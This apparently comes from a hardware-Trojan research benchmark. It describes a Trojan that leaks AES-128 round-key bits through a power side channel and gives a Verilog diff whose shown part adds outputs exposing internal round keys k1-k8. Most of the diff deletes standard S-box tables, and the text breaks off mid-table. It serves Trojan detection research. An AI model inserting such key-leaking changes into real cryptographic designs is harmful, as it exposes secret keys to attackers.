1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Whenever a predefined input plaintext is observed, the Trojan demonstrates an attack on the AES-128 
	block-cipher and its corresponding key schedule. The idea is to artificially introduce leaking intermediate 
	states in the key schedule that depend on known input bits and key bits, but that naturally would not 
	occur during regular processing of the cipher. The Trojan uses AND conjunctions to pairwise combine each 
	key bit with another input bit. The output of the AND gates are then combined to the leaked intermediate 
	value by XORing all of them. The Trojan leaks one byte of the AES round key for each round of the key schedule. 
	The leakage circuit (LC) is a 16-bit shift register and loaded it with an initial alternating sequence 
	of zeros and ones. The shift register is only enabled in case the input to the leakage circuit is one, 
	which results in an additional dynamic power consumption [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t1300/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1300/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,10 +14,11 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
     input          clk;
     input  [127:0] state, key;
-    output [127:0] out;
+    output [127:0] out;
+	 output [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
     reg    [127:0] s0, k0;
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
@@ -27,7 +28,16 @@ module aes_128(clk, state, key, out);
       begin
         s0 &lt;= state ^ key;
         k0 &lt;= key;
-      end
+      end
+
+	 assign rk1 = k1;
+	 assign rk2 = k2;
+	 assign rk3 = k3;
+	 assign rk4 = k4;
+	 assign rk5 = k5;
+	 assign rk6 = k6;
+	 assign rk7 = k7;
+	 assign rk8 = k8;
 
     expand_key_128
         a1 (clk, k0, k1, k0b, 8&apos;h1),
diff -rupN aes/src/tjfree/one_round.v aes/src/tjin-t1300/one_round.v
--- aes/src/tjfree/one_round.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1300/one_round.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,81 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-/* one AES round for every two clock cycles */
-module one_round (clk, state_in, key, state_out);
-    input              clk;
-    input      [127:0] state_in, key;
-    output reg [127:0] state_out;
-    wire       [31:0]  s0,  s1,  s2,  s3,
-                       z0,  z1,  z2,  z3,
-                       p00, p01, p02, p03,
-                       p10, p11, p12, p13,
-                       p20, p21, p22, p23,
-                       p30, p31, p32, p33,
-                       k0,  k1,  k2,  k3;
-
-    assign {k0, k1, k2, k3} = key;
-
-    assign {s0, s1, s2, s3} = state_in;
-
-    table_lookup
-        t0 (clk, s0, p00, p01, p02, p03),
-        t1 (clk, s1, p10, p11, p12, p13),
-        t2 (clk, s2, p20, p21, p22, p23),
-        t3 (clk, s3, p30, p31, p32, p33);
-
-    assign z0 = p00 ^ p11 ^ p22 ^ p33 ^ k0;
-    assign z1 = p03 ^ p10 ^ p21 ^ p32 ^ k1;
-    assign z2 = p02 ^ p13 ^ p20 ^ p31 ^ k2;
-    assign z3 = p01 ^ p12 ^ p23 ^ p30 ^ k3;
-
-    always @ (posedge clk)
-        state_out &lt;= {z0, z1, z2, z3};
-endmodule
-
-/* AES final round for every two clock cycles */
-module final_round (clk, state_in, key_in, state_out);
-    input              clk;
-    input      [127:0] state_in;
-    input      [127:0] key_in;
-    output reg [127:0] state_out;
-    wire [31:0] s0,  s1,  s2,  s3,
-                z0,  z1,  z2,  z3,
-                k0,  k1,  k2,  k3;
-    wire [7:0]  p00, p01, p02, p03,
-                p10, p11, p12, p13,
-                p20, p21, p22, p23,
-                p30, p31, p32, p33;
-    
-    assign {k0, k1, k2, k3} = key_in;
-    
-    assign {s0, s1, s2, s3} = state_in;
-
-    S4
-        S4_1 (clk, s0, {p00, p01, p02, p03}),
-        S4_2 (clk, s1, {p10, p11, p12, p13}),
-        S4_3 (clk, s2, {p20, p21, p22, p23}),
-        S4_4 (clk, s3, {p30, p31, p32, p33});
-
-    assign z0 = {p00, p11, p22, p33} ^ k0;
-    assign z1 = {p10, p21, p32, p03} ^ k1;
-    assign z2 = {p20, p31, p02, p13} ^ k2;
-    assign z3 = {p30, p01, p12, p23} ^ k3;
-
-    always @ (posedge clk)
-        state_out &lt;= {z0, z1, z2, z3};
-endmodule
-
diff -rupN aes/src/tjfree/table_lookup.v aes/src/tjin-t1300/table_lookup.v
--- aes/src/tjfree/table_lookup.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1300/table_lookup.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,590 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-module table_lookup (clk, state, p0, p1, p2, p3);
-    input clk;
-    input [31:0] state;
-    output [31:0] p0, p1, p2, p3;
-    wire [7:0] b0, b1, b2, b3;
-    
-    assign {b0, b1, b2, b3} = state;
-    T
-        t0 (clk, b0, {p0[23:0], p0[31:24]}),
-        t1 (clk, b1, {p1[15:0], p1[31:16]}),
-        t2 (clk, b2, {p2[7:0],  p2[31:8]} ),
-        t3 (clk, b3, p3);
-endmodule
-
-/* substitue four bytes in a word */
-module S4 (clk, in, out);
-    input clk;
-    input [31:0] in;
-    output [31:0] out;
-    
-    S
-        S_0 (clk, in[31:24], out[31:24]),
-        S_1 (clk, in[23:16], out[23:16]),
-        S_2 (clk, in[15:8],  out[15:8] ),
-        S_3 (clk, in[7:0],   out[7:0]  );
-endmodule
-
-/* S_box, S_box, S_box*(x+1), S_box*x */
-module T (clk, in, out);
-    input         clk;
-    input  [7:0]  in;
-    output [31:0] out;
-    
-    S
-        s0 (clk, in, out[31:24]);
-    assign out[23:16] = out[31:24];
-    xS
-        s4 (clk, in, out[7:0]);
-    assign out[15:8] = out[23:16] ^ out[7:0];
-endmodule
-
-/* S box */
-module S (clk, in, out);
-    input clk;
-    input [7:0] in;
-    output reg [7:0] out;
-
-    always @ (posedge clk)
-    case (in)
-    8&apos;h00: out &lt;= 8&apos;h63;
-    8&apos;h01: out &lt;= 8&apos;h7c;
-    8&apos;h02: out &lt;= 8&apos;h77;
-    8&apos;h03: out &lt;= 8&apos;h7b;
-    8&apos;h04: out &lt;= 8&apos;hf2;
-    8&apos;h05: out &lt;= 8&apos;h6b;
-    8&apos;h06: out &lt;= 8&apos;h6f;
-    8&apos;h07: out &lt;= 8&apos;hc5;
-    8&apos;h08: out &lt;= 8&apos;h30;
-    8&apos;h09: out &lt;= 8&apos;h01;
-    8&apos;h0a: out &lt;= 8&apos;h67;
-    8&apos;h0b: out &lt;= 8&apos;h2b;
-    8&apos;h0c: out &lt;= 8&apos;hfe;
-    8&apos;h0d: out &lt;= 8&apos;hd7;
-    8&apos;h0e: out &lt;= 8&apos;hab;
-    8&apos;h0f: out &lt;= 8&apos;h76;
-    8&apos;h10: out &lt;= 8&apos;hca;
-    8&apos;h11: out &lt;= 8&apos;h82;
-    8&apos;h12: out &lt;= 8&apos;hc9;
-    8&apos;h13: out &lt;= 8&apos;h7d;
-    8&apos;h14: out &lt;= 8&apos;hfa;
-    8&apos;h15: out &lt;= 8&apos;h59;
-    8&apos;h16: out &lt;= 8&apos;h47;
-    8&apos;h17: out &lt;= 8&apos;hf0;
-    8&apos;h18: out &lt;= 8&apos;had;
-    8&apos;h19: out &lt;= 8&apos;hd4;
-    8&apos;h1a: out &lt;= 8&apos;ha2;
-    8&apos;h1b: out &lt;= 8&apos;haf;
-    8&apos;h1c: out &lt;= 8&apos;h9c;
-    8&apos;h1d: out &lt;= 8&apos;ha4;
-    8&apos;h1e: out &lt;= 8&apos;h72;
-    8&apos;h1f: out &lt;= 8&apos;hc0;
-    8&apos;h20: out &lt;= 8&apos;hb7;
-    8&apos;h21: out &lt;= 8&apos;hfd;
-    8&apos;h22: out &lt;= 8&apos;h93;
-    8&apos;h23: out &lt;= 8&apos;h26;
-    8&apos;h24: out &lt;= 8&apos;h36;
-    8&apos;h25: out &lt;= 8&apos;h3f;
-    8&apos;h26: out &lt;= 8&apos;hf7;
-    8&apos;h27: out &lt;= 8&apos;hcc;
-    8&apos;h28: out &lt;= 8&apos;h34;
-    8&apos;h29: out &lt;= 8&apos;ha5;
-    8&apos;h2a: out &lt;= 8&apos;he5;
-    8&apos;h2b: out &lt;= 8&apos;hf1;
-    8&apos;h2c: out &lt;= 8&apos;h71;
-    8&apos;h2d: out &lt;= 8&apos;hd8;
-    8&apos;h2e: out &lt;= 8&apos;h31;
-    8&apos;h2f: out &lt;= 8&apos;h15;
-    8&apos;h30: out &lt;= 8&apos;h04;
-    8&apos;h31: out &lt;= 8&apos;hc7;
-    8&apos;h32: out &lt;= 8&apos;h23;
-    8&apos;h33: out &lt;= 8&apos;hc3;
-    8&apos;h34: out &lt;= 8&apos;h18;
-    8&apos;h35: out &lt;= 8&apos;h96;
-    8&apos;h36: out &lt;= 8&apos;h05;
-    8&apos;h37: out &lt;= 8&apos;h9a;
-    8&apos;h38: out &lt;= 8&apos;h07;
-    8&apos;h39: out &lt;= 8&apos;h12;
-    8&apos;h3a: out &lt;= 8&apos;h80;
-    8&apos;h3b: out &lt;= 8&apos;he2;
-    8&apos;h3c: out &lt;= 8&apos;heb;
-    8&apos;h3d: out &lt;= 8&apos;h27;
-    8&apos;h3e: out &lt;= 8&apos;hb2;
-    8&apos;h3f: out &lt;= 8&apos;h75;
-    8&apos;h40: out &lt;= 8&apos;h09;
-    8&apos;h41: out &lt;= 8&apos;h83;
-    8&apos;h42: out &lt;= 8&apos;h2c;
-    8&apos;h43: out &lt;= 8&apos;h1a;
-    8&apos;h44: out &lt;= 8&apos;h1b;
-    8&apos;h45: out &lt;= 8&apos;h6e;
-    8&apos;h46: out &lt;= 8&apos;h5a;
-    8&apos;h47: out &lt;= 8&apos;ha0;
-    8&apos;h48: out &lt;= 8&apos;h52;
-    8&apos;h49: out &lt;= 8&apos;h3b;
-    8&apos;h4a: out &lt;= 8&apos;hd6;
-    8&apos;h4b: out &lt;= 8&apos;hb3;
-    8&apos;h4c: out &lt;= 8&apos;h29;
-    8&apos;h4d: out &lt;= 8&apos;he3;
-    8&apos;h4e: out &lt;= 8&apos;h2f;
-    8&apos;h4f: out &lt;= 8&apos;h84;
-    8&apos;h50: out &lt;= 8&apos;h53;
-    8&apos;h51: out &lt;= 8&apos;hd1;
-    8&apos;h52: out &lt;= 8&apos;h00;
-    8&apos;h53: out &lt;= 8&apos;hed;
-    8&apos;h54: out &lt;= 8&apos;h20;
-    8&apos;h55: out &lt;= 8&apos;hfc;
-    8&apos;h56: out &lt;= 8&apos;hb1;
-    8&apos;h57: out &lt;= 8&apos;h5b;
-    8&apos;h58: out &lt;= 8&apos;h6a;
-    8&apos;h59: out &lt;= 8&apos;hcb;
-    8&apos;h5a: out &lt;= 8&apos;hbe;
-    8&apos;h5b: out &lt;= 8&apos;h39;
-    8&apos;h5c: out &lt;= 8&apos;h4a;
-    8&apos;h5d: out &lt;= 8&apos;h4c;
-    8&apos;h5e: out &lt;= 8&apos;h58;
-    8&apos;h5f: out &lt;= 8&apos;hcf;
-    8&apos;h60: out &lt;= 8&apos;hd0;
-    8&apos;h61: out &lt;= 8&apos;hef;
-    8&apos;h62: out &lt;= 8&apos;haa;
-    8&apos;h63: out &lt;= 8&apos;hfb;
-    8&apos;h64: out &lt;= 8&apos;h43;
-    8&apos;h65: out &lt;= 8&apos;h4d;
-    8&apos;h66: out &lt;= 8&apos;h33;
-    8&apos;h67: out &lt;= 8&apos;h85;
-    8&apos;h68: out &lt;= 8&apos;h45;
-    8&apos;h69: out &lt;= 8&apos;hf9;
-    8&apos;h6a: out &lt;= 8&apos;h02;
-    8&apos;h6b: out &lt;= 8&apos;h7f;
-    8&apos;h6c: out &lt;= 8&apos;h50;
-    8&apos;h6d: out &lt;= 8&apos;h3c;
-    8&apos;h6e: out &lt;= 8&apos;h9f;
-    8&apos;h6f: out &lt;= 8&apos;ha8;
-    8&apos;h70: out &lt;= 8&apos;h51;
-    8&apos;h71: out &lt;= 8&apos;ha3;
-    8&apos;h72: out &lt;= 8&apos;h40;
-    8&apos;h73: out &lt;= 8&apos;h8f;
-    8&apos;h74: out &lt;= 8&apos;h92;
-    8&apos;h75: out &lt;= 8&apos;h9d;
-    8&apos;h76: out &lt;= 8&apos;h38;
-    8&apos;h77: out &lt;= 8&apos;hf5;
-    8&apos;h78: out &lt;= 8&apos;hbc;
-    8&apos;h79: out &lt;= 8&apos;hb6;
-    8&apos;h7a: out &lt;= 8&apos;hda;
-    8&apos;h7b: out &lt;= 8&apos;h21;
-    8&apos;h7c: out &lt;= 8&apos;h10;
-    8&apos;h7d: out &lt;= 8&apos;hff;
-    8&apos;h7e: out &lt;= 8&apos;hf3;
-    8&apos;h7f: out &lt;= 8&apos;hd2;
-    8&apos;h80: out &lt;= 8&apos;hcd;
-    8&apos;h81: out &lt;= 8&apos;h0c;
-    8&apos;h82: out &lt;= 8&apos;h13;
-    8&apos;h83: out &lt;= 8&apos;hec;
-    8&apos;h84: out &lt;= 8&apos;h5f;
-    8&apos;h85: out &lt;= 8&apos;h97;
-    8&apos;h86: out &lt;= 8&apos;h44;
-    8&apos;h87: out &lt;= 8&apos;h17;
-    8&apos;h88: out &lt;= 8&apos;hc4;
-    8&apos;h89: out &lt;= 8&apos;ha7;
-    8&apos;h8a: out &lt;= 8&apos;h7e;
-    8&apos;h8b: out &lt;= 8&apos;h3d;
-    8&apos;h8c: out &lt;= 8&apos;h64;
-    8&apos;h8d: out &lt;= 8&apos;h5d;
-    8&apos;h8e: out &lt;= 8&apos;h19;
-    8&apos;h8f: out &lt;= 8&apos;h73;
-    8&apos;h90: out &lt;= 8&apos;h60;
-    8&apos;h91: out &lt;= 8&apos;h81;
-    8&apos;h92: out &lt;= 8&apos;h4f;
-    8&apos;h93: out &lt;= 8&apos;hdc;
-    8&apos;h94: out &lt;= 8&apos;h22;
-    8&apos;h95: out &lt;= 8&apos;h2a;
-    8&apos;h96: out &lt;= 8&apos;h90;
-    8&apos;h97: out &lt;= 8&apos;h88;
-    8&apos;h98: out &lt;= 8&apos;h46;
-    8&apos;h99: out &lt;= 8&apos;hee;
-    8&apos;h9a: out &lt;= 8&apos;hb8;
-    8&apos;h9b: out &lt;= 8&apos;h14;
-    8&apos;h9c: out &lt;= 8&apos;hde;
-    8&apos;h9d: out &lt;= 8&apos;h5e;
-    8&apos;h9e: out &lt;= 8&apos;h0b;
-    8&apos;h9f: out &lt;= 8&apos;hdb;
-    8&apos;ha0: out &lt;= 8&apos;he0;
-    8&apos;ha1: out &lt;= 8&apos;h32;
-    8&apos;ha2: out &lt;= 8&apos;h3a;
-    8&apos;ha3: out &lt;= 8&apos;h0a;
-    8&apos;ha4: out &lt;= 8&apos;h49;
-    8&apos;ha5: out &lt;= 8&apos;h06;
-    8&apos;ha6: out &lt;= 8&apos;h24;
-    8&apos;ha7: out &lt;= 8&apos;h5c;
-    8&apos;ha8: out &lt;= 8&apos;hc2;
-    8&apos;ha9: out &lt;= 8&apos;hd3;
-    8&apos;haa: out &lt;= 8&apos;hac;
-    8&apos;hab: out &lt;= 8&apos;h62;
-    8&apos;hac: out &lt;= 8&apos;h91;
-    8&apos;had: out &lt;= 8&apos;h95;
-    8&apos;hae: out &lt;= 8&apos;he4;
-    8&apos;haf: out &lt;= 8&apos;h79;
-    8&apos;hb0: out &lt;= 8&apos;he7;
-    8&apos;hb1: out &lt;= 8&apos;hc8;
-    8&apos;hb2: out &lt;= 8&apos;h37;
-    8&apos;hb3: out &lt;= 8&apos;h6d;
-    8&apos;hb4: out &lt;= 8&apos;h8d;
-    8&apos;hb5: out &lt;= 8&apos;hd5;
-    8&apos;hb6: out &lt;= 8&apos;h4e;
-    8&apos;hb7: out &lt;= 8&apos;ha9;
-    8&apos;hb8: out &lt;= 8&apos;h6c;
-    8&apos;hb9: out &lt;= 8&apos;h56;
-    8&apos;hba: out &lt;= 8&apos;hf4;
-    8&apos;hbb: out &lt;= 8&apos;hea;
-    8&apos;hbc: out &lt;= 8&apos;h65;
-    8&apos;hbd: out &lt;= 8&apos;h7a;
-    8&apos;hbe: out &lt;= 8&apos;hae;
-    8&apos;hbf: out &lt;= 8&apos;h08;
-    8&apos;hc0: out &lt;= 8&apos;hba;
-    8&apos;hc1: out &lt;= 8&apos;h78;
-    8&apos;hc2: out &lt;= 8&apos;h25;
-    8&apos;hc3: out &lt;= 8&apos;h2e;
-    8&apos;hc4: out &lt;= 8&apos;h1c;
-    8&apos;hc5: out &lt;= 8&apos;ha6;
-    8&apos;hc6: out &lt;= 8&apos;hb4;
-    8&apos;hc7: out &lt;= 8&apos;hc6;
-    8&apos;hc8: out &lt;= 8&apos;he8;
-    8&apos;hc9: out &lt;= 8&apos;hdd;
-    8&apos;hca: out &lt;= 8&apos;h74;
-    8&apos;hcb: out &lt;= 8&apos;h1f;
-    8&apos;hcc: out &lt;= 8&apos;h4b;
-    8&apos;hcd: out &lt;= 8&apos;hbd;
-    8&apos;hce: out &lt;= 8&apos;h8b;
-    8&apos;hcf: out &lt;= 8&apos;h8a;
-    8&apos;hd0: out &lt;= 8&apos;h70;
-    8&apos;hd1: out &lt;= 8&apos;h3e;
-    8&apos;hd2: out &lt;= 8&apos;hb5;
-    8&apos;hd3: out &lt;= 8&apos;h66;
-    8&apos;hd4: out &lt;= 8&apos;h48;
-    8&apos;hd5: out &lt;= 8&apos;h03;
-    8&apos;hd6: out &lt;= 8&apos;hf6;
-    8&apos;hd7: out &lt;= 8&apos;h0e;
-    8&apos;hd8: out &lt;= 8&apos;h61;
-    8&apos;hd9: out &lt;= 8&apos;h35;
-    8&apos;hda: out &lt;= 8&apos;h57;
-    8&apos;hdb: out &lt;= 8&apos;hb9;
-    8&apos;hdc: out &lt;= 8&apos;h86;
-    8&apos;hdd: out &lt;= 8&apos;hc1;
-    8&apos;hde: out &lt;= 8&apos;h1d;
-    8&apos;hdf: out &lt;= 8&apos;h9e;
-    8&apos;he0: out &lt;= 8&apos;he1;
-    8&apos;he1: out &lt;= 8&apos;hf8;
-    8&apos;he2: out &lt;= 8&apos;h98;
-    8&apos;he3: out &lt;= 8&apos;h11;
-    8&apos;he4: out &lt;= 8&apos;h69;
-    8&apos;he5: out &lt;= 8&apos;hd9;
-    8&apos;he6: out &lt;= 8&apos;h8e;
-    8&apos;he7: out &lt;= 8&apos;h94;
-    8&apos;he8: out &lt;= 8&apos;h9b;
-    8&apos;he9: out &lt;= 8&apos;h1e;
-    8&apos;hea: out &lt;= 8&apos;h87;
-    8&apos;heb: out &lt;= 8&apos;he9;
-    8&apos;hec: out &lt;= 8&apos;hce;
-    8&apos;hed: out &lt;= 8&apos;h55;
-    8&apos;hee: out &lt;= 8&apos;h28;
-    8&apos;hef: out &lt;= 8&apos;hdf;
-    8&apos;hf0: out &lt;= 8&apos;h8c;
-    8&apos;hf1: out &lt;= 8&apos;ha1;
-    8&apos;hf2: out &lt;= 8&apos;h89;
-    8&apos;hf3: out &lt;= 8&apos;h0d;
-    8&apos;hf4: out &lt;= 8&apos;hbf;
-    8&apos;hf5: out &lt;= 8&apos;he6;
-    8&apos;hf6: out &lt;= 8&apos;h42;
-    8&apos;hf7: out &lt;= 8&apos;h68;
-    8&apos;hf8: out &lt;= 8&apos;h41;
-    8&apos;hf9: out &lt;= 8&apos;h99;
-    8&apos;hfa: out &lt;= 8&apos;h2d;
-    8&apos;hfb: out &lt;= 8&apos;h0f;
-    8&apos;hfc: out &lt;= 8&apos;hb0;
-    8&apos;hfd: out &lt;= 8&apos;h54;
-    8&apos;hfe: out &lt;= 8&apos;hbb;
-    8&apos;hff: out &lt;= 8&apos;h16;
-    endcase
-endmodule
-
-/* S box * x */
-module xS (clk, in, out);
-    input clk;
-    input [7:0] in;
-    output reg [7:0] out;
-
-    always @ (posedge clk)
-    case (in)
-    8&apos;h00: out &lt;= 8&apos;hc6;
-    8&apos;h01: out &lt;= 8&apos;hf8;
-    8&apos;h02: out &lt;= 8&apos;hee;
-    8&apos;h03: out &lt;= 8&apos;hf6;
-    8&apos;h04: out &lt;= 8&apos;hff;
-    8&apos;h05: out &lt;= 8&apos;hd6;
-    8&apos;h06: out &lt;= 8&apos;hde;
-    8&apos;h07: out &lt;= 8&apos;h91;
-    8&apos;h08: out &lt;= 8&apos;h60;
-    8&apos;h09: out &lt;= 8&apos;h02;
-    8&apos;h0a: out &lt;= 8&apos;hce;
-    8&apos;h0b: out &lt;= 8&apos;h56;
-    8&apos;h0c: out &lt;= 8&apos;he7;
-    8&apos;h0d: out &lt;= 8&apos;hb5;
-    8&apos;h0e: out &lt;= 8&apos;h4d;
-    8&apos;h0f: out &lt;= 8&apos;hec;
-    8&apos;h10: out &lt;= 8&apos;h8f;
-    8&apos;h11: out &lt;= 8&apos;h1f;
-    8&apos;h12: out &lt;= 8&apos;h89;
-    8&apos;h13: out &lt;= 8&apos;hfa;
-    8&apos;h14: out &lt;= 8&apos;hef;
-    8&apos;h15: out &lt;= 8&apos;hb2;
-    8&apos;h16: out &lt;= 8&apos;h8e;
-    8&apos;h17: out &lt;= 8&apos;hfb;
-    8&apos;h18: out &lt;= 8&apos;h41;
-    8&apos;h19: out &lt;= 8&apos;hb3;
-    8&apos;h1a: out &lt;= 8&apos;h5f;
-    8&apos;h1b: out &lt;= 8&apos;h45;
-    8&apos;h1c: out &lt;= 8&apos;h23;
-    8&apos;h1d: out &lt;= 8&apos;h53;
-    8&apos;h1e: out &lt;= 8&apos;he4;
-    8&apos;h1f: out &lt;= 8&apos;h9b;
-    8&apos;h20: out &lt;= 8&apos;h75;
-    8&apos;h21: out &lt;= 8&apos;he1;
-    8&apos;h22: out &lt;= 8&apos;h3d;
-    8&apos;h23: out &lt;= 8&apos;h4c;
-    8&apos;h24: out &lt;= 8&apos;h6c;
-    8&apos;h25: out &lt;= 8&apos;h7e;
-    8&apos;h26: out &lt;= 8&apos;hf5;
-    8&apos;h27: out &lt;= 8&apos;h83;
-    8&apos;h28: out &lt;= 8&apos;h68;
-    8&apos;h29: out &lt;= 8&apos;h51;
-    8&apos;h2a: out &lt;= 8&apos;hd1;
-    8&apos;h2b: out &lt;= 8&apos;hf9;
-    8&apos;h2c: out &lt;= 8&apos;he2;
-    8&apos;h2d: out &lt;= 8&apos;hab;
-    8&apos;h2e: out &lt;= 8&apos;h62;
-    8&apos;h2f: out &lt;= 8&apos;h2a;
-    8&apos;h30: out &lt;= 8&apos;h08;
-    8&apos;h31: out &lt;= 8&apos;h95;
-    8&apos;h32: out &lt;= 8&apos;h46;
-    8&apos;h33: out &lt;= 8&apos;h9d;
-    8&apos;h34: out &lt;= 8&apos;h30;
-    8&apos;h35: out &lt;= 8&apos;h37;
-    8&apos;h36: out &lt;= 8&apos;h0a;
-    8&apos;h37: out &lt;= 8&apos;h2f;
-    8&apos;h38: out &lt;= 8&apos;h0e;
-    8&apos;h39: out &lt;= 8&apos;h24;
-    8&apos;h3a: out &lt;= 8&apos;h1b;
-    8&apos;h3b: out &lt;= 8&apos;hdf;
-    8&apos;h3c: out &lt;= 8&apos;hcd;
-    8&apos;h3d: out &lt;= 8&apos;h4e;
-    8&apos;h3e: out &lt;= 8&apos;h7f;
-    8&apos;h3f: out &lt;= 8&apos;hea;
-    8&apos;h40: out &lt;= 8&apos;h12;
-    8&apos;h41: out &lt;= 8&apos;h1d;
-    8&apos;h42: out &lt;= 8&apos;h58;
-    8&apos;h43: out &lt;= 8&apos;h34;
-    8&apos;h44: out &lt;= 8&apos;h36;
-    8&apos;h45: out &lt;= 8&apos;hdc;
-    8&apos;h46: out &lt;= 8&apos;hb4;
-    8&apos;h47: out &lt;= 8&apos;h5b;
-    8&apos;h48: out &lt;= 8&apos;ha4;
-    8&apos;h49: out &lt;= 8&apos;h76;
-    8&apos;h4a: out &lt;= 8&apos;hb7;
-    8&apos;h4b: out &lt;= 8&apos;h7d;
-    8&apos;h4c: out &lt;= 8&apos;h52;
-    8&apos;h4d: out &lt;= 8&apos;hdd;
-    8&apos;h4e: out &lt;= 8&apos;h5e;
-    8&apos;h4f: out &lt;= 8&apos;h13;
-    8&apos;h50: out &lt;= 8&apos;ha6;
-    8&apos;h51: out &lt;= 8&apos;hb9;
-    8&apos;h52: out &lt;= 8&apos;h00;
-    8&apos;h53: out &lt;= 8&apos;hc1;
-    8&apos;h54: out &lt;= 8&apos;h40;
-    8&apos;h55: out &lt;= 8&apos;he3;
-    8&apos;h56: out &lt;= 8&apos;h79;
-    8&apos;h57: out &lt;= 8&apos;hb6;
-    8&apos;h58: out &lt;= 8&apos;hd4;
-    8&apos;h59: out &lt;= 8&apos;h8d;
-    8&apos;h5a: out &lt;= 8&apos;h67;
-    8&apos;h5b: out &lt;= 8&apos;h72;
-    8&apos;h5c: out &lt;= 8&apos;h94;
-    8&apos;h5d: out &lt;= 8&apos;h98;
-    8&apos;h5e: out &lt;= 8&apos;hb0;
-    8&apos;h5f: out &lt;= 8&apos;h85;
-    8&apos;h60: out &lt;= 8&apos;hbb;
-    8&apos;h61: out &lt;= 8&apos;hc5;
-    8&apos;h62: out &lt;= 8&apos;h4f;
-    8&apos;h63: out &lt;= 8&apos;hed;
-    8&apos;h64: out &lt;= 8&apos;h86;
-    8&apos;h65: out &lt;= 8&apos;h9a;
-    8&apos;h66: out &lt;= 8&apos;h66;
-    8&apos;h67: out &lt;= 8&apos;h11;
-    8&apos;h68: out &lt;= 8&apos;h8a;
-    8&apos;h69: out &lt;= 8&apos;he9;
-    8&apos;h6a: out &lt;= 8&apos;h04;
-    8&apos;h6b: out &lt;= 8&apos;hfe;
-    8&apos;h6c: out &lt;= 8&apos;ha0;
-    8&apos;h6d: out &lt;= 8&apos;h78;
-    8&apos;h6e: out &lt;= 8&apos;h25;
-    8&apos;h6f: out &lt;= 8&apos;h4b;
-    8&apos;h70: out &lt;= 8&apos;ha2;
-    8&apos;h71: out &lt;= 8&apos;h5d;
-    8&apos;h72: out &lt;= 8&apos;h80;
-    8&apos;h73: out &lt;= 8&apos;h05;
-    8&apos;h74: out &lt;= 8&apos;h3f;
-    8&apos;h75: out &lt;= 8&apos;h21;
-    8&apos;h76: out &lt;= 8&apos;h70;
-    8&apos;h77: out &lt;= 8&apos;hf1;
-    8&apos;h78: out &lt;= 8&apos;h63;
-    8&apos;h79: out &lt;= 8&apos;h77;
-    8&apos;h7a: out &lt;= 8&apos;haf;
-    8&apos;h7b: out &lt;= 8&apos;h42;
-    8&apos;h7c: out &lt;= 8&apos;h20;
-    8&apos;h7d: out &lt;= 8&apos;he5;
-    8&apos;h7e: out &lt;= 8&apos;hfd;
-    8&apos;h7f: out &lt;= 8&apos;hbf;
-    8&apos;h80: out &lt;= 8&apos;h81;
-    8&apos;h81: out &lt;= 8&apos;h18;
-    8&apos;h82: out &lt;= 8&apos;h26;
-    8&apos;h83: out &lt;= 8&apos;hc3;
-    8&apos;h84: out &lt;= 8&apos;hbe;
-    8&apos;h85: out &lt;= 8&apos;h35;
-    8&apos;h86: out &lt;= 8&apos;h88;
-    8&apos;h87: out &lt;= 8&apos;h2e;
-    8&apos;h88: out &lt;= 8&apos;h93;
-    8&apos;h89: out &lt;= 8&apos;h55;
-    8&apos;h8a: out &lt;= 8&apos;hfc;
-    8&apos;h8b: out &lt;= 8&apos;h7a;
-    8&apos;h8c: out &lt;= 8&apos;hc8;
-    8&apos;h8d: out &lt;= 8&apos;hba;
-    8&apos;h8e: out &lt;= 8&apos;h32;
-    8&apos;h8f: out &lt;= 8&apos;he6;
-    8&apos;h90: out &lt;= 8&apos;hc0;
-    8&apos;h91: out &lt;= 8&apos;h19;
-    8&apos;h92: out &lt;= 8&apos;h9e;
-    8&apos;h93: out &lt;= 8&apos;ha3;
-    8&apos;h94: out &lt;= 8&apos;h44;
-    8&apos;h95: out &lt;= 8&apos;h54;
-    8&apos;h96: out &lt;= 8&apos;h3b;
-    8&apos;h97: out &lt;= 8&apos;h0b;
-    8&apos;h98: out &lt;= 8&apos;h8c;
-    8&apos;h99: out &lt;= 8&apos;hc7;
-    8&apos;h9a: out &lt;= 8&apos;h6b;
-    8&apos;h9b: out &lt;= 8&apos;h28;
-    8&apos;h9c: out &lt;= 8&apos;ha7;
